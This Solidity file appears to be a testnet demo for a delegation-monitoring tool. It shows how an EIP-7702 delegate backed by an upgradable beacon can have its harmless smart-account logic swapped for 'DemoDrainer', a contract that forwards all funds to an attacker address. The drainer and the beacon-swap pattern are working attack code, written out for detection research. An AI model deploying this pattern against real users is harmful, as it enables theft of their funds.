// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/**
 * Sepolia-only demo for the PreSign Delegation Radar (npm run radar:demo).
 *
 * The attack it shows: an EIP-7702 delegate whose own code never changes, but whose LOGIC lives
 * behind a beacon. Users delegate while the logic is harmless (DemoSmartAccount); later the beacon
 * owner swaps it for a drainer (DemoDrainer). Nothing about the delegate address changed, so a
 * "trusted address" list can't notice. The Watchtower does: the logic fingerprint changes -> Alert.
 *
 * Test funds only. The "attacker" is our own test wallet.
 */

/// Holds the current implementation. Whoever owns it can swap the logic for every delegated account.
contract DemoBeacon {
    address public owner;
    address public implementation;

    event Upgraded(address indexed implementation);

    constructor(address impl) {
        owner = msg.sender;
        implementation = impl;
    }

    function upgradeTo(address impl) external {
        require(msg.sender == owner, "not owner");
        implementation = impl;
        emit Upgraded(impl);
    }
}

/// The EIP-7702 delegate: fixed code, but every call runs whatever the beacon points to.
contract DemoBeaconDelegate {
    DemoBeacon public immutable beacon;

    constructor(DemoBeacon b) {
        beacon = b;
    }

    fallback() external payable {
        _run();
    }

    receive() external payable {
        _run();
    }

    function _run() private {
        address impl = beacon.implementation();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// v1 logic: a harmless smart account. Only the account itself can make it call out.
contract DemoSmartAccount {
    function execute(address to, uint256 value, bytes calldata data) external payable {
        require(msg.sender == address(this), "only the account itself");
        (bool ok, ) = to.call{value: value}(data);
        require(ok, "call failed");
    }

    receive() external payable {}
}

/// v2 logic: a drainer. Anyone can call sweep(); every incoming payment is forwarded too.
contract DemoDrainer {
    address public immutable attacker;

    constructor(address a) {
        attacker = a;
    }

    function sweep() external {
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
